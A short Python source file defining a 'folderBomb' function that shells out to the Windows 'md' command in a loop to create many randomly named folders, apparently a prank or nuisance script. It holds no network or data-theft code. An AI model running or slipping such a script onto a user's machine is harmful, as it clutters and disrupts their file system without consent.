import os
import random


def folderBomb(number_of_folders=100):
    for i in range(number_of_folders):
        os.system("md {}".format(random.randint(0, 100000000000000)))
